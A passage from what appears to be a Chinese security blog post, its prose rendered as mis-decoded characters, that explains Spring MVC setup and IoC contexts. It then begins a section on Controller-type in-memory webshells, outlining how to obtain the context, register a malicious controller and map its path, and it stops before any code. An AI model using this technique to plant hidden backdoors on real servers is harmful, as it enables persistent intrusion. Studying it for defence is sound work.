class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.helloworld.controller;<br> <br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br> <br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorldController</span> &#123;<br> <br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">Hello</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-52.png" alt="img34"></p><h4 id="Spring-MVCã€Tomcatå’ŒServlet"><a href="#Spring-MVCã€Tomcatå’ŒServlet" class="headerlink" title="Spring MVCã€Tomcatå’ŒServlet"></a>Spring MVCã€Tomcatå’ŒServlet</h4><p>é¦–å…ˆæ¥è®¾æƒ³è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼Œå‡å¦‚è®©æˆ‘ä»¬è‡ªå·±æ‰‹åŠ¨å®ç°ä¸€ä¸ªç®€æ˜“çš„WebæœåŠ¡å™¨ï¼Œæˆ‘ä»¬ä¼šæ€ä¹ˆåšï¼Ÿ</p><p>é¦–å…ˆæˆ‘ä»¬è‚¯å®šè¦æ¥æ”¶å®¢æˆ·ç«¯å‘æ¥çš„TCPæ•°æ®åŒ…ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªTCPServeræ¥ç›‘å¬80ç«¯å£ã€‚æ¥ç€æˆ‘ä»¬éœ€è¦å°†TCPæ•°æ®åŒ…è§£ææˆHTTPåè®®ï¼Œè·å–URLè·¯å¾„ã€å‚æ•°åˆ—è¡¨ç­‰æ•°æ®ä¿¡æ¯ã€‚å†ç„¶åå°±æ˜¯æ‰§è¡Œå„ç§é€»è¾‘å¤„ç†ã€‚æœ€åå°±æ˜¯æŠŠå¤„ç†çš„ç»“æœå°è£…æˆHTTPåè®®è¿”å›ç»™æµè§ˆå™¨ï¼Œå¹¶ä¸”ç­‰æµè§ˆå™¨æ”¶åˆ°å“åº”åæ–­å¼€è¿æ¥ã€‚ä»¥ä¸Šå°±æ˜¯ä¸€ä¸ªç®€æ˜“WebæœåŠ¡å™¨çš„å®ç°é€»è¾‘ï¼Œå½“ç„¶ï¼ŒçœŸæ­£çš„WebæœåŠ¡å™¨å¯èƒ½è¦æ¯”ä¸Šè¿°æ›´åŠ å¤æ‚ä¸€äº›ï¼Œä½†æ ¸å¿ƒåŠŸèƒ½æ˜¯ä¸å˜çš„ï¼šæ¥å—è¯·æ±‚ã€å¤„ç†è¯·æ±‚ã€è¿”å›å“åº”ã€‚</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/12652505-b014ed371a9ea749.webp" alt="img35"></p><p>å½“ç„¶ï¼Œå¦‚æœæˆ‘ä»¬åœ¨å¤„ç†ä¸šåŠ¡æ—¶æ¯æ¬¡éƒ½è¦è¿›è¡Œä¸€éä¸Šè¿°æµç¨‹ï¼Œè¿™æœªå…å¤ªç¹çã€‚å…¶å®æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨ä¸Šè¿°æµç¨‹ä¸­ï¼Œç½‘ç»œé€šä¿¡ã€HTTPåè®®è§£æå’Œå°è£…éƒ¨åˆ†çš„å®ç°éƒ½ç›¸å¯¹å›ºå®šã€‚æœ‰å˜åŒ–çš„éƒ¨åˆ†å…¶å®åªæœ‰é€»è¾‘å¤„ç†å™¨ï¼Œéœ€è¦æˆ‘ä»¬æ ¹æ®ä¸åŒè¯·æ±‚åŒ…è€Œåšå‡ºç›¸åº”çš„é€»è¾‘å¤„ç†ã€‚å› æ­¤ï¼Œä¸ºäº†æé«˜å¼€å‘æ•ˆç‡ï¼Œæˆ‘ä»¬èƒ½ä¸èƒ½å°†ä¸å˜çš„éƒ¨åˆ†å°è£…èµ·æ¥å‘¢ï¼Ÿè¿™å…¶å®å°±æ˜¯æˆ‘ä»¬çš„WebæœåŠ¡å™¨ã€‚</p><p>Tomcatå°±æ˜¯è¿™æ ·ä¸€ç§æœåŠ¡å™¨ï¼Œå®ƒå…¶å®å°±æ˜¯ä¸€ä¸ªèƒ½å¤Ÿç›‘å¬TCPè¿æ¥è¯·æ±‚ï¼Œè§£æHTTPæŠ¥æ–‡ï¼Œå°†è§£æç»“æœä¼ ç»™å¤„ç†é€»è¾‘å™¨ã€æ¥æ”¶å¤„ç†é€»è¾‘å™¨çš„è¿”å›ç»“æœå¹¶é€šè¿‡TCPè¿”å›ç»™æµè§ˆå™¨çš„ä¸€ä¸ªæ¡†æ¶ã€‚åœ¨Tomcatå„ç§ç»„ä»¶ä¸­ï¼ŒConnnectorå°±æ˜¯è´Ÿè´£ç½‘ç»œé€šä¿¡çš„ï¼Œè€ŒContainerä¸­çš„Servletå°±æ˜¯æˆ‘ä»¬çš„é€»è¾‘å¤„ç†å™¨ã€‚</p><p><img src="https://goodapple.top/wp-content/uploads/2022/04/Tomcat-1.png" alt="img36"></p><p>å› æ­¤Tomcatå°±æ˜¯ä¸€ä¸ªServletå®¹å™¨ï¼Œå®ƒå°†å‰åç«¯äº¤äº’è¿‡ç¨‹ä¸­ä¸å˜çš„ä¸œè¥¿ï¼ˆç½‘ç»œé€šä¿¡ã€åè®®è§£æç­‰ï¼‰å°è£…äº†èµ·æ¥ã€‚è€ŒServletæ˜¯ä¸€ä¸ªé€»è¾‘å¤„ç†å™¨ï¼Œå®ƒå¯ä»¥è¢«Tomcatåˆ›å»ºã€è°ƒç”¨å’Œé”€æ¯ã€‚æ‰€ä»¥æˆ‘ä»¬çš„Webç¨‹åºæ ¸å¿ƒæ˜¯åŸºäºServletçš„ï¼Œè€ŒWebç¨‹åºçš„å¯åŠ¨ä¾é Tomcatã€‚</p><p>é‚£Spring MVCå‘¢ï¼ŸSpringæ˜¯åˆ©ç”¨æ³¨è§£ã€åå°„å’Œæ¨¡æ¿ç­‰æŠ€æœ¯å®ç°çš„ä¸€ç§æ¡†æ¶ã€‚å…¶æ ¸å¿ƒç±»æ˜¯ç»§æ‰¿äºHttpServletçš„DispatchServletã€‚é‚£æ—¢ç„¶æ˜¯Servletï¼Œé‚£è´Ÿè´£çš„è‚¯å®šå°±æ˜¯é€»è¾‘å¤„ç†éƒ¨åˆ†äº†ï¼Œé‚£ä¹ˆå°±éœ€è¦Tomcatè¿™æ ·çš„æœåŠ¡å™¨æ¥ç»™Springæä¾›è¿è¡Œç¯å¢ƒã€‚</p><h4 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring MVC"></a>Spring MVC</h4><h5 id="Spring-MVCçš„è¿è¡Œæµç¨‹"><a href="#Spring-MVCçš„è¿è¡Œæµç¨‹" class="headerlink" title="Spring MVCçš„è¿è¡Œæµç¨‹"></a>Spring MVCçš„è¿è¡Œæµç¨‹</h5><p><img src="https://goodapple.top/wp-content/uploads/2022/05/1571816061.png" alt="img37"></p><p>å®¢æˆ·ç«¯å‘é€Requestï¼ŒDispatcherServlet(ç­‰åŒäºControlleræ§åˆ¶å™¨)ï¼Œæ§åˆ¶å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œæ¥åˆ°HandlerMappingï¼ˆåœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®ï¼‰ï¼ŒHandlerMappingä¼šå¯¹URLè¿›è¡Œè§£æï¼Œå¹¶åˆ¤æ–­å½“å‰URLè¯¥äº¤ç»™å“ªä¸ªControlleræ¥å¤„ç†ï¼Œæ‰¾åˆ°å¯¹åº”çš„Controllerä¹‹åï¼ŒControllerå°±è·ŸServerã€JavaBeanè¿›è¡Œäº¤äº’ï¼Œå¾—åˆ°æŸä¸€ä¸ªå€¼ï¼Œå¹¶è¿”å›ä¸€ä¸ªè§†å›¾ï¼ˆModelAndViewè¿‡ç¨‹ï¼‰ï¼ŒDispathcheré€šè¿‡ViewResolverè§†å›¾è§£æå™¨,æ‰¾åˆ°ModelAndViewå¯¹è±¡æŒ‡å®šçš„è§†å›¾å¯¹è±¡,æœ€åï¼Œè§†å›¾å¯¹è±¡è´Ÿè´£æ¸²æŸ“è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p><h5 id="åˆ›å»ºä¸€ä¸ªç®€å•çš„Spring-MVCé¡¹ç›®"><a href="#åˆ›å»ºä¸€ä¸ªç®€å•çš„Spring-MVCé¡¹ç›®" class="headerlink" title="åˆ›å»ºä¸€ä¸ªç®€å•çš„Spring MVCé¡¹ç›®"></a>åˆ›å»ºä¸€ä¸ªç®€å•çš„Spring MVCé¡¹ç›®</h5><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨Mavenæ¥åˆ›å»ºä¸€ä¸ªç®€å•çš„SpringMVCé¡¹ç›®ã€‚åˆ›å»ºå¥½Mavené¡¹ç›®åæ·»åŠ ç›¸åº”çš„Springmvcä¾èµ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br>&lt;properties&gt;<br>    &lt;project.build.sourceEncoding&gt;UTF-<span class="hljs-number">8</span>&lt;/project.build.sourceEncoding&gt;<br>    &lt;maven.compiler.source&gt;<span class="hljs-number">1.7</span>&lt;/maven.compiler.source&gt;<br>    &lt;maven.compiler.target&gt;<span class="hljs-number">1.7</span>&lt;/maven.compiler.target&gt;<br>    &lt;org.springframework-version&gt;<span class="hljs-number">4.1</span><span class="hljs-number">.4</span>.RELEASE&lt;/org.springframework-version&gt;<br>  &lt;/properties&gt;<br> <br>  &lt;dependencies&gt;<br>    &lt;dependency&gt;<br>      &lt;groupId&gt;junit&lt;/groupId&gt;<br>      &lt;artifactId&gt;junit&lt;/artifactId&gt;<br>      &lt;version&gt;<span class="hljs-number">4.11</span>&lt;/version&gt;<br>      &lt;scope&gt;test&lt;/scope&gt;<br>    &lt;/dependency&gt;<br>    &lt;dependency&gt;<br>      &lt;groupId&gt;org.springframework&lt;/groupId&gt;<br>      &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;<br>      &lt;version&gt;$&#123;org.springframework-version&#125;&lt;/version&gt;<br>    &lt;/dependency&gt;<br>    &lt;dependency&gt;<br>      &lt;groupId&gt;org.springframework&lt;/groupId&gt;<br>      &lt;artifactId&gt;spring-web&lt;/artifactId&gt;<br>      &lt;version&gt;$&#123;org.springframework-version&#125;&lt;/version&gt;<br>    &lt;/dependency&gt;<br> <br>    &lt;!-- Tag libs support <span class="hljs-keyword">for</span> view layer --&gt;<br>    &lt;dependency&gt;<br>      &lt;groupId&gt;javax.servlet&lt;/groupId&gt;<br>      &lt;artifactId&gt;jstl&lt;/artifactId&gt;<br>      &lt;version&gt;<span class="hljs-number">1.2</span>&lt;/version&gt;<br>      &lt;scope&gt;runtime&lt;/scope&gt;<br>    &lt;/dependency&gt;<br>    &lt;dependency&gt;<br>      &lt;groupId&gt;taglibs&lt;/groupId&gt;<br>      &lt;artifactId&gt;standard&lt;/artifactId&gt;<br>      &lt;version&gt;<span class="hljs-number">1.1</span><span class="hljs-number">.2</span>&lt;/version&gt;<br>      &lt;scope&gt;runtime&lt;/scope&gt;<br>    &lt;/dependency&gt;<br> <br>  &lt;/dependencies&gt;<br>...<br></code></pre></td></tr></table></figure><p>åˆ›å»ºSpringé…ç½®æ–‡ä»¶<code>springmvc.xml</code></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-57.png" alt="img37"></p><p>ç¼–å†™<code>web.xml</code>æ–‡ä»¶æ¥é…ç½®Servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;web-app xmlns=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br>         xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>         xsi:schemaLocation=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br>         version=<span class="hljs-string">&quot;4.0&quot;</span>&gt;<br> <br>  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;<br> <br>  <span class="hljs-comment">//ä½¿ç”¨é»˜è®¤çš„DispatcherServlet</span><br>  &lt;servlet&gt;<br>    &lt;servlet-name&gt;spring&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;<br>    &lt;init-param&gt;<br>      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;<br>       <span class="hljs-comment">//springé…ç½®æ–‡ä»¶è·¯å¾„</span><br>      &lt;param-value&gt;/WEB-INF/springmvc.xml&lt;/param-value&gt;<br>    &lt;/init-param&gt;<br>    &lt;load-on-startup&gt;<span class="hljs-number">1</span>&lt;/load-on-startup&gt;<br>  &lt;/servlet&gt;<br> <br>  &lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;spring&lt;/servlet-name&gt;<br>    <span class="hljs-comment">//è·¯å¾„è®¾ç½®ä¸ºæ ¹ç›®å½•</span><br>    &lt;url-pattern&gt;/&lt;/url-pattern&gt;<br>  &lt;/servlet-mapping&gt;<br> <br> <br>&lt;/web-app&gt;<br></code></pre></td></tr></table></figure><p>é…ç½®springmvc.xml</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>       xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xmlns:mvc=<span class="hljs-string">&quot;http://www.springframework.org/schema/mvc&quot;</span><br>       xmlns:context=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span><br>       xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;<br> <br>    <span class="hljs-comment">//è®¾ç½®æ³¨è§£æ‰«æåŒ…è·¯å¾„</span><br>    &lt;context:component-scan base-<span class="hljs-keyword">package</span>=<span class="hljs-string">&quot;com.controller&quot;</span>/&gt;<br> <br>    &lt;!-- å¼€å¯springMVCçš„æ³¨è§£é©±åŠ¨ï¼Œä½¿å¾—urlå¯ä»¥æ˜ å°„åˆ°å¯¹åº”çš„controller --&gt;<br>    &lt;mvc:annotation-driven /&gt;<br> <br>    &lt;!-- è§†å›¾è§£æ --&gt;<br>    &lt;bean class=<span class="hljs-string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;<br>        &lt;property name=<span class="hljs-string">&quot;prefix&quot;</span> value=<span class="hljs-string">&quot;/WEB-INF/views/&quot;</span>/&gt;<br>        &lt;property name=<span class="hljs-string">&quot;suffix&quot;</span> value=<span class="hljs-string">&quot;.jsp&quot;</span>/&gt;<br>    &lt;/bean&gt;<br> <br> <br>&lt;/beans&gt;<br></code></pre></td></tr></table></figure><p>åœ¨<code>com.controller</code>åŒ…ä¸‹åˆ›å»ºtestæ§åˆ¶å™¨</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-58.png" alt="img38"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.controller;<br> <br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br> <br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br> <br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é…ç½®Tomcatï¼Œæ·»åŠ ç›¸åº”waråŒ…</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-59.png" alt="img39"></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-60.png" alt="img40"></p><p>å¯åŠ¨Tomcatï¼Œè®¿é—®<code>http://localhost/hello</code></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-61.png" alt="img41"></p><h3 id="Controllerå‹å†…å­˜é©¬"><a href="#Controllerå‹å†…å­˜é©¬" class="headerlink" title="Controllerå‹å†…å­˜é©¬"></a>Controllerå‹å†…å­˜é©¬</h3><h4 id="Bean"><a href="#Bean" class="headerlink" title="Bean"></a>Bean</h4><p><code>Bean</code> æ˜¯ Spring æ¡†æ¶çš„ä¸€ä¸ª<strong>æ ¸å¿ƒæ¦‚å¿µ</strong>ï¼Œå®ƒæ˜¯æ„æˆåº”ç”¨ç¨‹åºçš„ä¸»å¹²ï¼Œå¹¶ä¸”æ˜¯ç”± <code>Spring IoC</code> å®¹å™¨è´Ÿè´£å®ä¾‹åŒ–ã€é…ç½®ã€ç»„è£…å’Œç®¡ç†çš„å¯¹è±¡ã€‚</p><ul><li>bean æ˜¯å¯¹è±¡</li><li>bean è¢« IoC å®¹å™¨ç®¡ç†</li><li>Spring åº”ç”¨ä¸»è¦æ˜¯ç”±ä¸€ä¸ªä¸ªçš„ bean æ„æˆçš„</li></ul><h4 id="IOCå®¹å™¨"><a href="#IOCå®¹å™¨" class="headerlink" title="IOCå®¹å™¨"></a>IOCå®¹å™¨</h4><p>å¦‚æœä¸€ä¸ªç³»ç»Ÿæœ‰å¤§é‡çš„ç»„ä»¶ï¼ˆç±»ï¼‰ï¼Œå…¶ç”Ÿå‘½å‘¨æœŸå’Œç›¸äº’ä¹‹é—´çš„ä¾èµ–å…³ç³»å¦‚æœç”±ç»„ä»¶è‡ªèº«æ¥ç»´æŠ¤ï¼Œä¸ä½†å¤§å¤§å¢åŠ äº†ç³»ç»Ÿçš„å¤æ‚åº¦ï¼Œè€Œä¸”ä¼šå¯¼è‡´ç»„ä»¶ä¹‹é—´æä¸ºç´§å¯†çš„è€¦åˆï¼Œç»§è€Œç»™æµ‹è¯•å’Œç»´æŠ¤å¸¦æ¥äº†æå¤§çš„å›°éš¾ã€‚è§£å†³è¿™ä¸€é—®é¢˜çš„æ ¸å¿ƒæ–¹æ¡ˆå°±æ˜¯IoCï¼ˆåˆç§°ä¸ºä¾èµ–æ³¨å…¥ï¼‰ã€‚ç”±IoCè´Ÿè´£åˆ›å»ºç»„ä»¶ã€æ ¹æ®ä¾èµ–å…³ç³»ç»„è£…ç»„ä»¶ã€æŒ‰ä¾èµ–é¡ºåºæ­£ç¡®é”€æ¯ç»„ä»¶ã€‚</p><p>IOCå®¹å™¨é€šè¿‡è¯»å–é…ç½®å…ƒæ•°æ®æ¥è·å–å¯¹è±¡çš„å®ä¾‹åŒ–ã€é…ç½®å’Œç»„è£…çš„æè¿°ä¿¡æ¯ã€‚é…ç½®çš„é›¶å…ƒæ•°æ®å¯ä»¥ç”¨<code>xml</code>ã€<code>Javaæ³¨è§£</code>æˆ–<code>Javaä»£ç </code>æ¥è¡¨ç¤ºã€‚</p><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>Spring æ¡†æ¶ä¸­ï¼Œ<code>BeanFactory</code> æ¥å£æ˜¯ <code>Spring</code> <strong>IoCå®¹å™¨</strong> çš„å®é™…ä»£è¡¨è€…</p><p>Springå®¹å™¨å°±æ˜¯ApplicationContextï¼Œå®ƒæ˜¯ä¸€ä¸ªæ¥å£ç»§æ‰¿äºBeanFactoryï¼Œæœ‰å¾ˆå¤šå®ç°ç±»ã€‚è·å¾—äº†ApplicationContextçš„å®ä¾‹ï¼Œå°±è·å¾—äº†IoCå®¹å™¨çš„å¼•ç”¨ã€‚æˆ‘ä»¬å¯ä»¥ä»ApplicationContextä¸­å¯ä»¥æ ¹æ®Beançš„IDè·å–Beanã€‚</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-55.png" alt="img42"></p><p>å› æ­¤ï¼Œ<code>org.springframework.context.ApplicationContext</code>æ¥å£ä¹Ÿä»£è¡¨äº† <code>IoCå®¹å™¨</code> ï¼Œå®ƒè´Ÿè´£å®ä¾‹åŒ–ã€å®šä½ã€é…ç½®åº”ç”¨ç¨‹åºä¸­çš„å¯¹è±¡(<code>bean</code>)åŠå»ºç«‹è¿™äº›å¯¹è±¡é—´(<code>beans</code>)çš„ä¾èµ–ã€‚</p><h4 id="Root-Contextå’ŒChild-Context"><a href="#Root-Contextå’ŒChild-Context" class="headerlink" title="Root Contextå’ŒChild Context"></a>Root Contextå’ŒChild Context</h4><p>æˆ‘ä»¬æ¥çœ‹çœ‹web.xmlé…ç½®æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br>  &lt;servlet&gt;<br>    &lt;servlet-name&gt;spring&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;<br>    &lt;init-param&gt;<br>      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;<br>      &lt;param-value&gt;/WEB-INF/springmvc.xml&lt;/param-value&gt;<br>    &lt;/init-param&gt;<br>    &lt;load-on-startup&gt;<span class="hljs-number">1</span>&lt;/load-on-startup&gt;<br>  &lt;/servlet&gt;<br>  &lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;spring&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/&lt;/url-pattern&gt;<br>  &lt;/servlet-mapping&gt;<br>...<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å°†DispatcherServletè®¾ç½®åˆ«åä¸ºspringï¼Œç„¶åå°†<code>contextConfigLocation</code> å‚æ•°å€¼é…ç½®ä¸º<code>/WEB-INF/springmvc.xml</code>ã€‚</p><p>ä¾ç…§è§„èŒƒï¼Œå½“æ²¡æœ‰æ˜¾å¼é…ç½® <code>contextConfigLocation</code> æ—¶ï¼Œç¨‹åºä¼šè‡ªåŠ¨å¯»æ‰¾ &#96;&#96;&#x2F;WEB-INF&#x2F;<servlet-name>-servlet.xml<code>ï¼Œä½œä¸ºé…ç½®æ–‡ä»¶ã€‚å› ä¸ºä¸Šé¢çš„ </code><servlet-name><code>æ˜¯</code>dispatcherServlet<code>ï¼Œæ‰€ä»¥å½“æ²¡æœ‰æ˜¾å¼é…ç½®æ—¶ï¼Œç¨‹åºä¾ç„¶ä¼šè‡ªåŠ¨æ‰¾åˆ° </code>&#x2F;WEB-INF&#x2F;dispatcherServlet-servlet.xml&#96; é…ç½®æ–‡ä»¶ã€‚</servlet-name></servlet-name></p><p>æ¯ä¸ªå…·ä½“çš„ <code>DispatcherServlet</code> åˆ›å»ºçš„æ˜¯ä¸€ä¸ª <code>Child Context</code>ï¼Œä»£è¡¨ä¸€ä¸ªç‹¬ç«‹çš„ <code>IoC å®¹å™¨</code>ï¼›è€Œ <code>ContextLoaderListener</code> æ‰€åˆ›å»ºçš„æ˜¯ä¸€ä¸ª <code>Root Context</code>ï¼Œä»£è¡¨å…¨å±€å”¯ä¸€çš„ä¸€ä¸ªå…¬å…± <code>IoC å®¹å™¨</code>ã€‚</p><p>å¦‚æœè¦è®¿é—®å’Œæ“ä½œ <code>bean</code> ï¼Œä¸€èˆ¬è¦è·å¾—å½“å‰ä»£ç æ‰§è¡Œç¯å¢ƒçš„<code>IoC å®¹å™¨</code> ä»£è¡¨è€… <code>ApplicationContext</code>ã€‚</p><ul><li>Spring åº”ç”¨ä¸­å¯ä»¥åŒæ—¶æœ‰å¤šä¸ª <code>Context</code>ï¼Œå…¶ä¸­åªæœ‰ä¸€ä¸ª <code>Root Context</code>ï¼Œå‰©ä¸‹çš„å…¨æ˜¯ <code>Child Context</code></li><li>æ‰€æœ‰<code>Child Context</code>éƒ½å¯ä»¥è®¿é—®åœ¨ <code>Root Context</code>ä¸­å®šä¹‰çš„ <code>bean</code>ï¼Œä½†æ˜¯<code>Root Context</code>æ— æ³•è®¿é—®<code>Child Context</code>ä¸­å®šä¹‰çš„ <code>bean</code></li><li>æ‰€æœ‰çš„<code>Context</code>åœ¨åˆ›å»ºåï¼Œéƒ½ä¼šè¢«ä½œä¸ºä¸€ä¸ªå±æ€§æ·»åŠ åˆ°äº† <code>ServletContext</code>ä¸­</li></ul><h4 id="ContextLoaderListener"><a href="#ContextLoaderListener" class="headerlink" title="ContextLoaderListener"></a>ContextLoaderListener</h4><p><code>ContextLoaderListener</code> ä¸»è¦è¢«ç”¨æ¥åˆå§‹åŒ–å…¨å±€å”¯ä¸€çš„<code>Root Context</code>ï¼Œå³ <code>Root WebApplicationContext</code>ã€‚è¿™ä¸ª <code>Root WebApplicationContext</code> ä¼šå’Œå…¶ä»– <code>Child Context</code> å®ä¾‹å…±äº«å®ƒçš„ <code>IoC å®¹å™¨</code>ï¼Œä¾›å…¶ä»– <code>Child Context</code> è·å–å¹¶ä½¿ç”¨å®¹å™¨ä¸­çš„ <code>bean</code>ã€‚</p><h4 id="å®ç°æ€è·¯"><a href="#å®ç°æ€è·¯" class="headerlink" title="å®ç°æ€è·¯"></a>å®ç°æ€è·¯</h4><p>å’ŒTomcatå†…å­˜é©¬ç±»ä¼¼ï¼Œæˆ‘ä»¬å°±éœ€è¦äº†è§£å¦‚ä½•åŠ¨æ€çš„æ³¨å†ŒControllerï¼Œæ€è·¯å¦‚ä¸‹</p><ol><li>è·å–ä¸Šä¸‹æ–‡ç¯å¢ƒ</li><li>æ³¨å†Œæ¶æ„Controller</li><li>é…ç½®è·¯å¾„æ˜ å°„</li></ol><h4 id="è·å–ä¸Šä¸‹æ–‡ç¯å¢ƒContext"><a 